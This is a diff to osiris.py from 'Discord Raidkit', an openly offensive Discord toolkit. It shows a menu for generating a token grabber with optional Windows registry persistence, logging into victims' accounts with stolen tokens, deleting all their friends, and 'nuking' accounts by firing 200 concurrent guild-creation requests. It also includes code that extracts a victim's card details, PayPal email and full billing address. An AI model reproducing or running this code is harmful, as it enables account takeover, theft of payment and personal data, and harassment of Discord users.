@@ -1,6 +1,6 @@
 """
-Discord Raidkit v2.3.3 — "The trojan horse of discord raiding"
-Copyright © 2022 the-cult-of-integral
+Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
+Copyright © 2023 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
 
@@ -8,60 +8,76 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 osiris.py stores the Osiris program for Discord Raidkit.
-osiris.py was last updated on 25/09/22 at 01:41.
+osiris.py was last updated on 05/03/23 at 23:19 UTC.
 """
 
+import asyncio
 import logging
 import os
 from time import sleep
 
+import httpx
 import requests
+from colorama import Fore, init
+from selenium import webdriver
+from selenium.common.exceptions import WebDriverException
 from selenium.webdriver import ActionChains
 from selenium.webdriver.common.by import By
 
-from display import show_osiris_screen
-from selenium import webdriver
-from selenium.common.exceptions import WebDriverException
+from utils import clear_screen, init_logger, repeat_prompt_until_valid_input
 
 LOGIN_ACTION_NONE = 0
 LOGIN_ACTION_REMOVE_FRIENDS = 1
 
-logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
-                    filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')
+init()
+init_logger()
 
 
 class Osiris:
-    def __init__(self, theme: str) -> None:
-        self.theme = theme
+    
+    __slots__ = ['auth', 'hint']
+    
+    def __init__(self) -> None:
         self.auth = ''
         self.hint = ''
-        self.guild_IDs = []
         return
 
-    def run(self) -> bool:
-        temp = ''
-        while temp != '6':
-            show_osiris_screen(self.theme, self.hint)
-            temp = input()
-            if temp == '1':
-                self.hint = self.generate_grabber()
-            elif temp == '2':
-                print('Enter a user authentication token: ', end='')
-                self.auth = input()
-                self.hint = self.get_account_info()
-            elif temp == '3':
-                print('Enter a user authentication token: ', end='')
-                self.auth = input()
-                self.hint = self.login(LOGIN_ACTION_NONE)
-            elif temp == '4':
-                print('Enter a user authentication token: ', end='')
-                self.auth = input()
-                self.hint = self.login(LOGIN_ACTION_REMOVE_FRIENDS)
-            elif temp == '5':
-                print('Enter a user authentication token: ', end='')
-                self.auth = input()
-                self.hint = self.nuke_account()
-        return True
+    def run(self) -> None:
+        while True:
+            match repeat_prompt_until_valid_input(f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's Osiris!
+
+{Fore.LIGHTBLUE_EX}[1] Generate Discord token grabber
+[2] Get a Discord account's details
+[3] Log into a discord account
+[4] Log into a discord account and remove all friends
+[5] Nuke a discord account
+{Fore.RED}[6] Exit
+
+{Fore.LIGHTWHITE_EX}{self.hint}
+
+{Fore.LIGHTGREEN_EX}>>> {Fore.LIGHTWHITE_EX}""", '123456'):
+                case '1':
+                    clear_screen()
+                    self.hint = self.generate_grabber() 
+                case '2':
+                    print('Enter a user authentication token: ', end='')
+                    self.auth = input()
+                    self.hint = self.get_account_info()
+                case '3':
+                    print('Enter a user authentication token: ', end='')
+                    self.auth = input()
+                    self.hint = self.login(LOGIN_ACTION_NONE)
+                case '4':
+                    print('Enter a user authentication token: ', end='')
+                    self.auth = input()
+                    self.hint = self.login(LOGIN_ACTION_REMOVE_FRIENDS)
+                case '5':
+                    print('Enter a user authentication token: ', end='')
+                    self.auth = input()
+                    self.hint = self.nuke_account()
+                case '6':
+                    clear_screen()
+                    break 
 
     @staticmethod
     def generate_grabber() -> str:
@@ -202,11 +218,12 @@ if __name__ == "__main__":
             do_reg_keg = input(
                 'Enter 1 to enable registry keys (will let the payload run every time the target logs into Windows): ')
 
-            if do_reg_keg == '1':
-                do_reg_keg = True
-            else:
-                do_reg_keg = False
-
+            match do_reg_keg:
+                case '1':
+                    do_reg_keg = True
+                case _:
+                    do_reg_keg = False
+                    
             try:
                 os.mkdir(folder)
                 os.rmdir(folder)
@@ -254,24 +271,30 @@ if __name__ == "__main__":
                 info += f'\n\nBilling Information\n{"*"*19}\n\n'
                 for source_data in bill_sources_response:
                     info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}'
-                    if source_data['type'] == 1 or source_data['type'] == 2:
-                        if source_data['type'] == 1:
+                    
+                    match source_data['type']:
+                        case 1:
                             info += f'[Card Brand]{" "*8}{source_data["brand"]}\n'
                             info += f'[Last 4 Digits]{" "*5}{source_data["last_4"]}\n'
                             info += f'[Expiry Date]{" "*7}{source_data["expires_month"]}/{source_data["expires_year"]}\n'
-                        
-                        if source_data['type'] == 2:
+                            info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
+                            info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
+                            info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
+                            info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
+                            info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
+                            info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
+                            info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
+                        case 2:
                             info += f'[PayPal Email]{" "*6}{source_data["email"]}'
-                        
-                        info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
-                        info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
-                        info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
-                        info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
-                        info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
-                        info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
-                        info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
-                    else:
-                        info += f'None'
+                            info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
+                            info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
+                            info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
+                            info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
+                            info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
+                            info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
+                            info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
+                        case _:
+                            info += 'None'
                 info += f'\n[Token]{" "*13}{self.auth}'
             return info
         else:
@@ -337,22 +360,17 @@ if __name__ == "__main__":
 
     def nuke_account(self) -> str:
 
-        def nuke_requests(d_headers: dict) -> None:
-            for i in range(200):
-                try:
-                    payload = {
-                        "name": "Hacked by the-cult-of-integral's Discord Raidkit!",
-                        "region": "europe",
-                        "icon": None,
-                        "channels": None
-                    }
-                    requests.post(
-                        "https://discord.com/api/v6/guilds",
-                        headers=d_headers,
-                        json=payload
-                    )
-                except (requests.exceptions.HTTPError, requests.exceptions.InvalidHeader):
-                    pass
+        async def nuke_requests(d_headers: dict) -> None:
+            payload = {
+                "name": "Hacked by the-cult-of-integral's Discord Raidkit!",
+                "region": "europe",
+                "icon": None,
+                "channels": None
+            }
+            
+            async with httpx.AsyncClient() as client:
+                tasks = [client.post("https://discord.com/api/v6/guilds", headers=d_headers, json=payload) for _ in range(200)]
+                await asyncio.gather(*tasks, return_exceptions=True)
 
             settings = {
                 "locale": "ja",
@@ -381,7 +399,6 @@ if __name__ == "__main__":
                 headers=d_headers,
                 json=settings
             )
-            return
 
         try:
             if self.check_auth()[0]:
@@ -398,9 +415,8 @@ if __name__ == "__main__":
                 }
 
                 url = "https://discord.com/api/v8/users/@me/settings"
-                r = requests.get(url, headers=headers)
-                self.guild_IDs = r.json()['guild_positions']
-                nuke_requests(headers)
+                _ = requests.get(url, headers=headers)
+                asyncio.run(nuke_requests(headers))
                 return 'User nuked successfully'
             else:
                 return 'User authentication token is not valid!'
